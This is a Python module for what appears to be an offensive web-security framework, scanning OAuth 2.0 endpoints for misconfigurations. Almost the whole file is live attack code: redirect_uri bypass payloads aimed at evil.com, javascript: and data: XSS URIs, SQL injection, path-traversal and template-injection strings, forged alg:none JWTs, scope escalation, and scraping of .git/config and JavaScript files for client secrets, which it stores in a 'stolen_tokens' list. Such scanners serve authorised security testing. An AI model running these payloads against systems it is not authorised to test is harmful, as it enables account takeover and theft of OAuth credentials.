import re
import json
import hashlib
import base64
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from modules.base import BaseModule
from core.utils import random_string


class OauthModule(BaseModule):
    name = "oauth"
    description = "OAuth 2.0 Misconfiguration Scanner"
    exploitable = True
    
    oauth_endpoints = [
        "/oauth/authorize", "/oauth/auth", "/oauth2/authorize", "/oauth2/auth",
        "/authorize", "/auth", "/login/oauth", "/api/oauth/authorize",
        "/connect/authorize", "/.well-known/openid-configuration",
    ]
    
    redirect_bypasses = [
        "https://evil.com", "//evil.com", "https://evil.com%2F.target.com",
        "https://target.com.evil.com", "https://evil.com/target.com",
        "https://target.com@evil.com", "https://evil.com#@target.com",
        "https://target.com%00.evil.com", "https://target.com/../evil.com",
        "https://target.com/callback/../../../evil.com",
        "https://evil.target.com", "https://test.target.com",
        "http://localhost", "http://127.0.0.1", "http://[::1]",
        "data:text/html,<script>alert(1)</script>", "javascript:alert(1)",
    ]
    
    async def scan(self, target):
        self.findings = []
        self.stolen_tokens = []
        base_url = self._get_base_url(target)
        
        oauth_urls = await self._discover_oauth_endpoints(base_url)
        
        for oauth_url in oauth_urls:
            await self._test_redirect_uri_bypass(oauth_url)
            await self._test_state_parameter(oauth_url)
            await self._test_scope_escalation(oauth_url)
            await self._test_token_leakage(oauth_url)
            await self._test_pkce_bypass(oauth_url)
            await self._test_id_token_substitution(oauth_url)
            await self._test_token_replay(oauth_url)
            
            if self.aggressive:
                await self._test_authorization_code_injection(oauth_url)
                await self._test_client_credential_leak(oauth_url, base_url)
                await self._test_token_exchange_attack(oauth_url, base_url)
                await self._test_nonce_reuse(oauth_url)
        
        await self._test_token_exposure(target)
        
        return self.findings
    
    async def _test_authorization_code_injection(self, oauth_url):
        parsed = urlparse(oauth_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        callback_urls = [
            f"{base}/callback",
            f"{base}/oauth/callback", 
            f"{base}/auth/callback",
            f"{base}/login/callback",
        ]
        
        malicious_codes = [
            "injected_code_12345",
            "' OR '1'='1",
            "admin_code",
            "../../../etc/passwd",
            "${7*7}",
        ]
        
        for callback in callback_urls:
            for code in malicious_codes:
                test_url = f"{callback}?code={code}&state=test123"
                resp = await self.http.get(test_url, allow_redirects=False)
                
                if resp.get("status") in [200, 302]:
                    text = resp.get("text", "").lower()
                    location = resp.get("headers", {}).get("location", "").lower()
                    
                    if "access_token" in text or "access_token" in location:
                        self.add_finding(
                            "CRITICAL",
                            "OAuth Authorization Code Injection",
                            url=callback,
                            evidence=f"Injected code '{code}' accepted",
                            confidence_evidence=["code_injection", "token_obtained"],
                            request_data={"method": "GET", "url": test_url}
                        )
                        return
                    
                    if resp.get("status") == 200 and "error" not in text:
                        self.add_finding(
                            "HIGH",
                            "OAuth Callback Accepts Arbitrary Code",
                            url=callback,
                            evidence=f"Code '{code}' not rejected",
                            confidence_evidence=["code_not_validated"],
                            request_data={"method": "GET", "url": test_url}
                        )
    
    async def _test_client_credential_leak(self, oauth_url, base_url):
        leak_paths = [
            "/.well-known/oauth-authorization-server",
            "/oauth/clients",
            "/api/oauth/applications",
            "/admin/oauth/clients",
            "/.git/config",
            "/config.js",
            "/static/js/main.js",
            "/app.js",
        ]
        
        for path in leak_paths:
            url = urljoin(base_url, path)
            resp = await self.http.get(url)
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                
                client_id_pattern = r'client[_-]?id["\s:=]+([a-zA-Z0-9_-]{10,})'
                client_secret_pattern = r'client[_-]?secret["\s:=]+([a-zA-Z0-9_-]{10,})'
                
                id_match = re.search(client_id_pattern, text, re.I)
                secret_match = re.search(client_secret_pattern, text, re.I)
                
                if id_match and secret_match:
                    self.add_finding(
                        "CRITICAL",
                        "OAuth Client Credentials Exposed",
                        url=url,
                        evidence=f"Client ID: {id_match.group(1)[:10]}..., Secret found",
                        confidence_evidence=["client_secret_leaked", "credentials_exposed"],
                        request_data={"method": "GET", "url": url}
                    )
                    self.stolen_tokens.append({
                        "type": "client_credentials",
                        "client_id": id_match.group(1),
                        "client_secret": secret_match.group(1)[:20] + "..."
                    })
                    return
    
    async def _test_token_exchange_attack(self, oauth_url, base_url):
        token_url = oauth_url.replace("/authorize", "/token").replace("/auth", "/token")
        
        exchange_payloads = [
            {
                "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
                "subject_token": "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
                "subject_token_type": "urn:ietf:params:oauth:token-type:access_token",
            },
            {
                "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
                "assertion": "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
            },
            {
                "grant_type": "client_credentials",
                "scope": "admin",
            },
        ]
        
        for payload in exchange_payloads:
            resp = await self.http.post(
                token_url,
                data=payload,
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
            
            if resp.get("status") == 200:
                try:
                    data = json.loads(resp.get("text", "{}"))
                    if data.get("access_token"):
                        self.add_finding(
                            "CRITICAL",
                            f"OAuth Token Exchange Attack Successful",
                            url=token_url,
                            evidence=f"Grant type: {payload.get('grant_type')}",
                            confidence_evidence=["token_exchange_bypass", "token_obtained"],
                            request_data={"method": "POST", "url": token_url, "grant_type": payload.get("grant_type")}
                        )
                        self.stolen_tokens.append({
                            "type": "token_exchange",
                            "access_token": data.get("access_token")[:20] + "..."
                        })
                        return
                except:
                    pass
    
    async def _test_nonce_reuse(self, oauth_url):
        fixed_nonce = "fixed_nonce_12345"
        
        params = {
            "client_id": "test_client",
            "redirect_uri": "https://target.com/callback",
            "response_type": "id_token",
            "scope": "openid",
            "state": random_string(16),
            "nonce": fixed_nonce,
        }
        
        test_url = f"{oauth_url}?{urlencode(params)}"
        
        resp1 = await self.http.get(test_url, allow_redirects=False)
        resp2 = await self.http.get(test_url, allow_redirects=False)
        
        if resp1.get("status") in [302, 303] and resp2.get("status") in [302, 303]:
            loc1 = resp1.get("headers", {}).get("location", "")
            loc2 = resp2.get("headers", {}).get("location", "")
            
            if "id_token=" in loc1 and "id_token=" in loc2:
                token1 = re.search(r'id_token=([^&]+)', loc1)
                token2 = re.search(r'id_token=([^&]+)', loc2)
                
                if token1 and token2 and token1.group(1) == token2.group(1):
                    self.add_finding(
                        "HIGH",
                        "OAuth Nonce Reuse - Token Replay Possible",
                        url=oauth_url,
                        evidence="Same nonce produces identical id_tokens",
                        confidence_evidence=["nonce_reuse", "replay_attack_possible"]
                    )
    
    def _get_base_url(self, url):
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"
    
    async def _discover_oauth_endpoints(self, base_url):
        found = []
        
        for endpoint in self.oauth_endpoints:
            url = urljoin(base_url, endpoint)
            resp = await self.http.get(url)
            
            if resp.get("status") in [200, 302, 400, 401]:
                text = resp.get("text", "").lower()
                
                if any(x in text for x in ["oauth", "authorize", "client_id", "redirect_uri", "response_type", "openid"]):
                    found.append(url)
                    self.log(f"[OAuth] Found endpoint: {endpoint}")
                
                if "well-known" in endpoint and resp.get("status") == 200:
                    try:
                        import json
                        config = json.loads(resp.get("text", "{}"))
                        if "authorization_endpoint" in config:
                            found.append(config["authorization_endpoint"])
                            self.add_finding(
                                "INFO",
                                "OpenID Connect Configuration Exposed",
                                url=url,
                                evidence=f"Endpoints: {list(config.keys())[:5]}"
                            )
                    except:
                        pass
        
        return found
    
    async def _test_redirect_uri_bypass(self, oauth_url):
        parsed = urlparse(oauth_url)
        
        for bypass in self.redirect_bypasses:
            params = {
                "client_id": "test_client",
                "redirect_uri": bypass,
                "response_type": "code",
                "scope": "openid profile email",
                "state": random_string(16),
            }
            
            test_url = f"{oauth_url}?{urlencode(params)}"
            resp = await self.http.get(test_url, allow_redirects=False)
            
            if resp.get("status") in [302, 303, 307]:
                location = resp.get("headers", {}).get("location", "")
                
                if "evil.com" in location or bypass in location:
                    self.add_finding(
                        "CRITICAL",
                        "OAuth Redirect URI Bypass - Token Theft Possible",
                        url=oauth_url,
                        parameter="redirect_uri",
                        evidence=f"Accepted malicious redirect: {bypass}"
                    )
                    return
                
                if any(x in location.lower() for x in ["evil", "localhost", "127.0.0.1"]):
                    self.add_finding(
                        "HIGH",
                        "OAuth Redirect URI Validation Weak",
                        url=oauth_url,
                        parameter="redirect_uri",
                        evidence=f"Payload: {bypass[:50]}, Redirect: {location[:100]}"
                    )
                    return
            
            if resp.get("status") == 200:
                text = resp.get("text", "").lower()
                if "invalid redirect" not in text and "redirect_uri" not in text:
                    if resp.get("status") == 200 and "authorize" in text:
                        self.add_finding(
                            "MEDIUM",
                            "OAuth May Accept Arbitrary redirect_uri",
                            url=oauth_url,
                            parameter="redirect_uri",
                            evidence=f"No validation error for: {bypass[:50]}"
                        )
    
    async def _test_state_parameter(self, oauth_url):
        params = {
            "client_id": "test_client",
            "redirect_uri": "https://target.com/callback",
            "response_type": "code",
            "scope": "openid",
        }
        
        test_url = f"{oauth_url}?{urlencode(params)}"
        resp = await self.http.get(test_url)
        
        if resp.get("status") in [200, 302]:
            text = resp.get("text", "").lower()
            
            if "state" not in text and "error" not in text:
                self.add_finding(
                    "MEDIUM",
                    "OAuth State Parameter Not Required",
                    url=oauth_url,
                    evidence="OAuth flow proceeds without state parameter (CSRF risk)"
                )
        
        for weak_state in ["1", "test", "state", "12345", ""]:
            params["state"] = weak_state
            test_url = f"{oauth_url}?{urlencode(params)}"
            resp = await self.http.get(test_url)
            
            if resp.get("status") in [200, 302] and "error" not in resp.get("text", "").lower():
                self.add_finding(
                    "LOW",
                    "OAuth Accepts Weak State Parameter",
                    url=oauth_url,
                    evidence=f"Accepted state: '{weak_state}'"
                )
                break
    
    async def _test_scope_escalation(self, oauth_url):
        elevated_scopes = [
            "admin", "write", "delete", "all", "root",
            "admin:read", "admin:write", "user:admin",
            "openid profile email admin", "*",
        ]
        
        for scope in elevated_scopes:
            params = {
                "client_id": "test_client",
                "redirect_uri": "https://target.com/callback",
                "response_type": "code",
                "scope": scope,
                "state": random_string(16),
            }
            
            test_url = f"{oauth_url}?{urlencode(params)}"
            resp = await self.http.get(test_url)
            
            if resp.get("status") in [200, 302]:
                text = resp.get("text", "").lower()
                
                if "error" not in text and "invalid scope" not in text and "invalid_scope" not in text:
                    self.add_finding(
                        "MEDIUM",
                        "OAuth Scope Escalation Possible",
                        url=oauth_url,
                        parameter="scope",
                        evidence=f"Accepted elevated scope: {scope}"
                    )
                    return
    
    async def _test_token_leakage(self, oauth_url):
        params = {
            "client_id": "test_client",
            "redirect_uri": "https://target.com/callback",
            "response_type": "token",
            "scope": "openid",
            "state": random_string(16),
        }
        
        test_url = f"{oauth_url}?{urlencode(params)}"
        resp = await self.http.get(test_url, allow_redirects=False)
        
        if resp.get("status") in [302, 303, 307]:
            location = resp.get("headers", {}).get("location", "")
            
            if "access_token=" in location or "#access_token" in location:
                parsed_location = urlparse(location)
                fragment_params = parse_qs(parsed_location.fragment)
                query_params = parse_qs(parsed_location.query)
                
                token = fragment_params.get("access_token", query_params.get("access_token", [""]))[0]
                token_preview = token[:20] + "..." if len(token) > 20 else token
                
                self.add_finding(
                    "HIGH",
                    "OAuth Token Exposed in URL (Implicit Flow)",
                    url=oauth_url,
                    evidence=f"Token in redirect: {token_preview}"
                )
        
        params["response_type"] = "token id_token"
        test_url = f"{oauth_url}?{urlencode(params)}"
        resp = await self.http.get(test_url)
        
        if resp.get("status") == 200:
            text = resp.get("text", "")
            if re.search(r'access_token["\s:=]+[a-zA-Z0-9._-]+', text):
                self.add_finding(
                    "CRITICAL",
                    "OAuth Access Token Exposed in Response",
                    url=oauth_url,
                    evidence="Token visible in page source"
                )
    
    async def _test_pkce_bypass(self, oauth_url):
        params = {
            "client_id": "test_client",
            "redirect_uri": "https://target.com/callback",
            "response_type": "code",
            "scope": "openid",
            "state": random_string(16),
        }
        
        test_url = f"{oauth_url}?{urlencode(params)}"
        resp = await self.http.get(test_url)
        
        if resp.get("status") in [200, 302]:
            text = resp.get("text", "").lower()
            
            if "code_challenge" not in text and "pkce" not in text:
                self.add_finding(
                    "MEDIUM",
                    "OAuth PKCE Not Required",
                    url=oauth_url,
                    evidence="Authorization proceeds without PKCE"
                )
    
    async def _test_id_token_substitution(self, oauth_url):
        fake_id_tokens = [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AZXhhbXBsZS5jb20iLCJyb2xlIjoiYWRtaW4ifQ.",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.x",
        ]
        for token in fake_id_tokens:
            resp = await self.http.get(
                oauth_url,
                headers={"Authorization": f"Bearer {token}", "X-ID-Token": token}
            )
            if resp.get("status") == 200:
                text = (resp.get("text") or "").lower()
                if "admin" in text or "dashboard" in text or "welcome" in text:
                    if "invalid" not in text and "error" not in text:
                        self.add_finding(
                            "CRITICAL",
                            "OAuth ID token substitution / forgery accepted",
                            url=oauth_url,
                            evidence="Fake/signed id_token accepted"
                        )
                        return
            resp = await self.http.post(
                oauth_url.replace("/authorize", "/token").replace("/auth", "/token"),
                data={"id_token": token, "grant_type": "implicit"},
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
            if resp.get("status") in [200, 201]:
                try:
                    import json
                    data = json.loads(resp.get("text", "{}"))
                    if data.get("access_token") or data.get("id_token"):
                        self.add_finding(
                            "CRITICAL",
                            "OAuth token endpoint accepts forged id_token",
                            url=oauth_url,
                            evidence="Token issued for substituted id_token"
                        )
                        return
                except Exception:
                    pass

    async def _test_token_replay(self, oauth_url):
        parsed = urlparse(oauth_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        token_urls = [
            urljoin(base, "/oauth/token"),
            urljoin(base, "/oauth2/token"),
            urljoin(base, "/token"),
            urljoin(base, "/api/oauth/token"),
        ]
        replay_payloads = [
            {"grant_type": "authorization_code", "code": "reused_code_123", "redirect_uri": "https://client.example/cb"},
            {"grant_type": "refresh_token", "refresh_token": "stolen_refresh_token"},
        ]
        for token_url in token_urls:
            for payload in replay_payloads:
                r1 = await self.http.post(token_url, data=payload)
                if r1.get("status") not in [200, 201]:
                    continue
                r2 = await self.http.post(token_url, data=payload)
                if r2.get("status") in [200, 201]:
                    try:
                        import json
                        d1 = json.loads(r1.get("text", "{}"))
                        d2 = json.loads(r2.get("text", "{}"))
                        if d1.get("access_token") and d2.get("access_token") and d1.get("access_token") == d2.get("access_token"):
                            self.add_finding(
                                "HIGH",
                                "OAuth token replay: same token issued twice",
                                url=token_url,
                                evidence="Authorization code or refresh token reused without invalidation"
                            )
                            return
                    except Exception:
                        pass

    async def _test_token_exposure(self, target):
        resp = await self.http.get(target)
        
        if resp.get("status") == 200:
            text = resp.get("text", "")
            
            token_patterns = [
                (r'access_token["\s:=]+([a-zA-Z0-9._-]{20,})', "Access Token"),
                (r'refresh_token["\s:=]+([a-zA-Z0-9._-]{20,})', "Refresh Token"),
                (r'id_token["\s:=]+([a-zA-Z0-9._-]{50,})', "ID Token"),
                (r'bearer["\s:]+([a-zA-Z0-9._-]{20,})', "Bearer Token"),
            ]
            
            for pattern, token_type in token_patterns:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    self.add_finding(
                        "CRITICAL",
                        f"OAuth {token_type} Exposed in Page",
                        url=target,
                        evidence=f"Token found: {match.group(1)[:20]}..."
                    )
